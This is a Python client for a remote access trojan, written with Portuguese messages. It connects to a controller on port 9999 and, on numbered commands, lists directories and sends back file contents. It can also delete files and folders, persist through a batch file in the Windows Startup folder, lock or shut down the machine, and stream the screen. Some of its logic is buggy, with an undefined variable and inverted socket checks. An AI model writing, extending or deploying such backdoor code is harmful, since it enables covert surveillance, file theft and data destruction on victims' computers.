import logging, getpass, os, ctypes, threading, socket
from time import sleep
from vidstream import ScreenShareClient

logger = logging.getLogger(__name__)
conectado = False
ativado = 1
USER_NAME = getpass.getuser()

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

def add_to_startup(file_path):
    if file_path:
        print("antes: ", file_path)
        file_path = os.path.abspath(os.path.realpath(file_path))
        print(file_path)
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


def remove_of_startup():
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    os.remove(bat_path + '\open.bat')


def is_socket_closed(sock: socket.socket) -> bool:
    try:
        # this will try to read bytes without blocking and also without removing them from buffer (peek only)
        data = sock.recv(1024)
        if len(data) == 0:
            return False
    except BlockingIOError:
        return data  # socket is open and reading from it would block
    except ConnectionResetError:
        return False  # socket was closed for some other reason
    except Exception as e:
        logger.exception("unexpected exception when checking if a socket is closed")
        return data
    return data


while ativado == 1:

    while conectado == False:

        try:
            s = socket.socket()
            host = local_ip
            port = 9999
            s.connect((host, port))
            conectado = True
            print("Conectado com sucesso....")
        except socket.error:
            print("Sleeping...")
            sleep(2)

    while conectado == True:

        try:

            teste = is_socket_closed(s)

            if teste == False:
                conectado = False
                print("Conectado:", conectado)
            else:

                data = teste
                data = data.decode()
                print(data)

                if data == '2':
                    try:
                        file = os.getcwd()
                        file = str(file)
                        s.send(file.encode())
                        print("Comando foi executado com sucesso no cliente...")
                    except:
                        print("Erro ao executar o comando : ver_cwd, Client Error")

                elif data == '3':
                    try:
                        user_input = s.recv(5000)
                        user_input = user_input.decode()
                        files = os.listdir(user_input)
                        files = str(files)
                        s.send(files.encode())
                        print("Comando executado com sucesso...")
                    except:
                        print("Erro ao executar o comando : ver_diretorios, Server Error")

                elif data == '4':
                    try:
                        file_path = s.recv(5000)
                        file_path = file_path.decode()
                        file = open(file_path, "rb")
                        new_data = file.read()
                        s.send(new_data)
                        print("File foi enviada com sucesso...")
                    except:
                        print("Erro ao executar o comando : Download, Client Error")

                elif data == '5':
                    try:
                        fileanddir = s.recv(6000)
                        fileanddir = fileanddir.decode()
                        os.remove(fileanddir)
                        print("Comando executado com sucesso.")
                    except:
                        print("Erro ao executar o comando : Client Error")

                elif data == '6':
                    try:
                        fileanddir = s.recv(6000)
                        fileanddir = fileanddir.decode()
                        os.rmdir(fileanddir)
                        print("Comando executado com sucesso.")
                    except:
                        print("Erro ao executar o comando : Client Error")

                elif data == '7':
                    try:
                        file = 'client.exe'
                        print("File", file)
                        add_to_startup(file)
                        print("Comando executado com sucesso.")

                    except:
                        print("Erro ao executar o comando : Client Error")

                elif data == '8':
                    try:
                        remove_of_startup()
                        print("Comando executado com sucesso.")

                    except:
                        print("Erro ao executar o comando : Client Error")

                elif data == '9':
                    try:
                        ctypes.windll.user32.LockWorkStation()
                    except:
                        print("Erro ao executar comando : Client Error")

                elif data == '10':
                    try:
                        os.system("shutdown /s /t 1")
                        s.close()
                    except:

                        print("Erro ao executador comando: Client Error")

                elif data == '11':
                    try:


                        sender = ScreenShareClient(local_ip, 9999)
                        t = threading.Thread(target=sender.start_stream)
                        t.start()

                        while deveparar == False:
                            deveparar = data
                            continue

                        sender.stop_stream()

                    except:

                        print("Erro ao executador comando: Client Error")


        except:

            print("Perda de concexão")
